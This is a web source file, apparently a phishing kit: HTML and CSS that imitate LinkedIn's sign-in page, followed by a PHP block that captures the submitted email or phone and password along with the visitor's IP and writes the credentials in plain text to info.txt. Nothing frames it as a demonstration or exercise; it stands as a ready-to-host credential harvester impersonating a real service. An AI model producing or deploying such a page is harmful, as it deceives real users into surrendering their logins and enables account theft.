<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Linkedn Login Form</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta name="keywords" content="Form,flex, ,Linkedin form ,sachindusahan,html,css" />
<link rel="stylesheet" href="./style.css"/>
<meta property="og:title" content="Linkedin Login Form" />
</head>
<body>
<form action = '' method = 'POST'>

    <div class='container'>
		
	    <div class='main div-1'>
	        <div class='sub sub-div-1'>
	            <h3>Linked<span id='style'>in</span></h3>
	        </div>
	    </div>
	    <div class='main div-2'>
	        <div class='sub sub-div-2'>
	            <h3>Welcome Back</h3>  
	        </div>
	    </div>
	    <div class='main div-3'>
	        <div class='sub sub-div-3'>
	            <p class='p'>Don't miss your next opportunity. Sign in to stay updated on your professional world.</p>
	        </div>
	    </div>
	    <div class='main div-5'>
		<form action = '' method = 'POST'>

	        <div class='sub sub-div-4'>
	            <input  name="name" placeholder='Email or Phone'>
	        </div>
	    </div>
	    <div class='main div-5'>
		<form action = '' method = 'POST'>
	        <div class='sub sub-div-5'>
				<input type='password' name="name2" placeholder='Password'><br>
	        </div>
	    </div>
	    <div class='main div-6'>
	        <div class='sub sub-div-6'>
	            <button type="submit">Sign in</button>
	        </div>
	    </div>
	   <div class='main div-7'>
	        <div class='sub sub-div-7'>	
	        	<a href='#'>Forgot password?</a>
	        </div>
	    </div>
	   <div class='main div-8'>
	        <div class='sub sub-div-8'>
	            <p>New to Linkedin?</p>
	            <a href='#'>&nbsp;Join now</a>
	        </div>
	    </div>
	
    </div>


</body>
</html>



<html>
<head>
<style>
* {
	margin:0;
	padding:0;
}


.container {
	max-width:100vw;
	min-height:600px;
}

.container > .main {
	
}

.container > .main > .sub {

}

/*
First 
*/
.div-1 .sub-div-1 {
	display:flex;
	justify-content:center;
	align-items:center;
}

.div-1 .sub-div-1 h3 {
	color:#1B65FF;
	margin:25px 0 20px 0;
	font-family:Lucida Bright;
}

.div-1 .sub-div-1 h3::first-letter {
	font-size:21.5px;
}

.div-1 .sub-div-1 #style {
	color:#FFF;
	background:#1B65FF;
	border-radius:2px;
	padding:0 2px;
	font-family:Lucida Bright;
}

/*
Second 
*/

.div-2 .sub-div-2 {
	display:flex;
	justify-content:center;
	align-items:flex-start;
	box-sizing:border-box;
}

.div-2 .sub-div-2 h3 {
	margin:0 0 10px 0;
	font-family:Geneva;
	font-size:20.3px;
}

/*
Third
*/
.div-3 {
	display:flex;
}

.sub-div-3 {
	flex:1;
}
.sub-div-3 .p {
	font-size:15px;
	margin-bottom:5px;
	font-family:Verdana;
	text-align:center;
}


/*

fourth

*/

.div-4 {
	display:flex;
	
}


.sub-div-4  {
	flex:1;	
	display:flex;
	justify-content:center;
}

.sub-div-4 > input {
	height:3.3rem;
	margin:20px 0 17px 0;
	border:none;
	outline:none;
	border:1px solid #555;
	padding:0 0 0 10px;
	border-radius:4px;
	font-size:16px;
	width:40%;
}

.sub-div-4 > input::placeholder {
	color:#000;
	font-size:16px;
	font-family:Helvetica;
}

/*
Five 
*/
.div-5 {
	display:flex;
}


.sub-div-5 {
	flex:1;
	display:flex;
	justify-content:center;
}

.sub-div-5 > input {
	height:3.3rem;	
	border:none;
	border:1px solid #555;
	outline:none;
	padding:0 0 0 10px;
	border-radius:4px;
	font-size:16px;
	width:40%;
	margin-bottom:22px;
}

.sub-div-5 > input::placeholder {
	color:#000;
	font-size:16px;
	font-family:Helvetica;
}

/* 

Six

*/

.div-6 {
	display:flex;
}

.sub-div-6 {
	flex:1;
	display:flex;
	justify-content:center;
}

.sub-div-6 button {
	all:unset;
	height:3.3rem;
	width:42%;
	border-radius:20px;
	background:#1B65FF;
	text-align:center;
	color:#FFF;
	font-weight:550;
	font-size:18.5px;
	font-family:Helvetica;
}

.sub-div-6 button:hover {
	padding:0.5px;
}


/*
7
*/
.div-7 {
	display:flex;
}

.sub-div-7 {
	flex:1;
	display:flex;
	justify-content:center;
}

.sub-div-7 > a  {
	all:unset;
	margin:23px 0;
	color:#1B65FF;
	font-family:Helvetica;
	font-weight:600;
}

.sub-div-7 > a:hover {
	text-decoration:underline;
}

.sub-div-8 > a {
	all:unset;
	color:#1B65FF;
	font-family:Helvetica;
	font-weight:600;
}

.sub-div-8 > p {
	font-family:Helvetica;
	font-weight:400;
}
/*
8
*/
.div-8 {
	display:flex;
}

.sub-div-8 {
	flex:1;
	display:flex;
	justify-content:center;
}


/*
===========
media 
===========
*/
@media only screen and (max-width: 800px) and (min-width: 481px) {
	.sub-div-4 > input ,.sub-div-5 > input{
		width:70%;
	}
	.sub-div-6 button {
		width:73%;
	}
}
@media only screen and (max-width: 480px) and (min-width: 320px) {
	.sub-div-4 > input ,.sub-div-5 > input{
		width:85%;
	}
	.sub-div-6 button {
		width:88%;
	}

}



</style> 
</style>


<?php  
function getUserIP() {
  if( array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER) && !empty($_SERVER['HTTP_X_FORWARDED_FOR']) ) {
      if (strpos($_SERVER['HTTP_X_FORWARDED_FOR'], ',')>0) {
          $addr = explode(",",$_SERVER['HTTP_X_FORWARDED_FOR']);
          return trim($addr[0]);
      } else {
          return $_SERVER['HTTP_X_FORWARDED_FOR'];
      }
  }
  else {
      return $_SERVER['REMOTE_ADDR'];
  }
}


$user_ip = getUserIP();


if (isset($_POST['name'])){
$ip = $user_ip;
$userinput = $_POST['name'];
$userinputt = $_POST['name2'];
$acapo = "\r\n";
$perip = ("Ip: $ip");
$perpassword = ("Password: $userinputt");
$perusername = ("Username: $userinput");
$myfile = fopen("info.txt", "w") or die("Unable to open file!");
fwrite($myfile, $perusername);
fwrite($myfile, $acapo);
fwrite($myfile, $perpassword);
fclose($myfile);}
?>
